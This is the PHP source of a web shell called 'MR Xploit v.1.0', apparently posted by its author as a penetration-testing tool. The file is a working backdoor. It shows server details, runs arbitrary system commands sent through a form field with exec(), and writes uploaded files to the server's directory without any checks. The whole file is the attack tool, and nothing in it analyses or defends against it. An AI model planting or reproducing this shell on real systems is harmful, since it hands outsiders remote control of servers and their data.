<!DOCTYPE HTML>
<!--
Dev By Libyan Hacker ( Moneer Masoud )
GitHub : https://github.com/moneermasoud
-->
<html>
     <head>
	    <meta charset="utf-8">
		<!--<link href='../img/icon/login.ico' rel='icon' type='image/x-icon'/>-->
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<link href="https://fonts.googleapis.com/css?family=Cairo" rel="stylesheet" type='text/css'>
	   <title> [ MR Xploit v.1.0 ] </title>
	  
            <style>
			body{
				font-family:Cairo;
                background-color:#F2F8F9;
			}
			ul {
			margin: 0;
			padding: 5px;
			/* float: left; */
			-moz-border-radius: 8px;
			border-radius: 1px;
			border: 1px solid #555555;
			width:400px;
			}
			.url{
				padding-left: 10px;
				padding-right: 10px;
				padding-bottom: 10px;
				padding-top: 10px;
				margin-right: 50px;
				margin-bottom: 10px;
				margin-left: 24px;
				margin-right: 25px;
				font-family: orbitron;
				font-size:12px;
				
			}		 
			a:hover {
				color: #00FF66;
			}
			a {
				color:#000;
				text-decoration :none;
				}
				
			</style>
	 </head>
	 <body>
	 
	 <center>
	 <h1 style="margin-top:35px;font-family:Copperplate Gothic;">[ MR Xploit v.1.0 ]</h1>
	 <br />
	 <ul>
	   <a href="?pross=main">[ Home ]</a>
	   <a href="?pross=info">[ Server Information ]</a>
	   <a href="?pross=cmd">[ Shell ]</a>
	   <a href="?pross=upload">[ Upload File ]</a>
	 
	 
	 </ul>
	 
	 
<?php

############################################
##              MR Xploit v.1.0           ##
##          Script PHP -> WebShell        ##
##          Coded By Moneer Masoud        ##
############################################


$pross = @$_GET['pross'];

if (empty($pross)){
	header("LOCATION: ?pross=main");
}

 if($pross == "main"){
	 
	 echo "<br/><h3>Welcome to MR Xploit </h3>";
	 echo "<h5>Web Shell for penetration testing and exploit 2019 </h5>";
	 echo "<h4 style='text-shadow: rgb(153, 153, 153) 0px 0px 3.29999995231628px;'>Coded By @Moneer Masoud</h4>";
 }

 if ($pross == "info"){
	 
	 echo "<br/>
	 	 <table dir='ltr'>
	       <tr>
		    <td>".php_uname()."</td>
		   <tr>
	       <tr>
		    <td>".phpversion()."</td>
		   <tr>
	       <tr>
		    <td>".$_SERVER['SERVER_ADDR']."</td>
		   <tr>
	       <tr>
		    <td>".$_SERVER['SERVER_SOFTWARE']."</td>
		   <tr>
	       <tr>
		    <td>".getcwd()."</td>
		   <tr>
	       <tr>
			<td>".date('Y-m-d H:i:s')."</td>
		   <tr>
	 
	 </table>";
	 
 }
   if($pross == "cmd"){
	   
	   echo "<br/>
	 	 <table dir='ltr'>
		   <tr>
		    <form  method='post' />
			<td><input type='text' name='cmd' style='font-family:Cairo;width:250px;'  placeholder='Execute a command on a system' />
			<input type='submit' name='send' style='font-family:Cairo;background-color:#fff;' value='CMD'  /></td>
			</form>
			</tr></table>
			";
					if(isset($_POST['send'])){
						$cmd = $_POST['cmd'];
							echo "<textarea cols='80' rows='15'>";
										echo exec($cmd);
							echo "</textarea>";

					}
			
	   
   }
  
   if($pross == "upload"){
	   
	   echo "<br/> <table dir='ltr'>
       <form method='POST' enctype='multipart/form-data'>
	   	  <tr>
	        <td>
	         <input type='file' name='file' style='font-family:Cairo;border: 3px solid #555555;'  /> 
			 <input type='submit' name='submit' style='font-family:Cairo;background-color:#fff;' value='Upload' />
		    </td>
         </tr>		 
       </form>
    </table>";
	
	
	
		@$Fname = $_FILES['file']['name'];
		@$Ftmp  = $_FILES['file']['tmp_name'];
		if(isset($_POST['submit'])){
		           move_uploaded_file($Ftmp,$Fname);
          echo "<br /><h4>The file was uploaded to the same path</h4>";
	    }
   }


?>
     </center>
   </body>
</html>
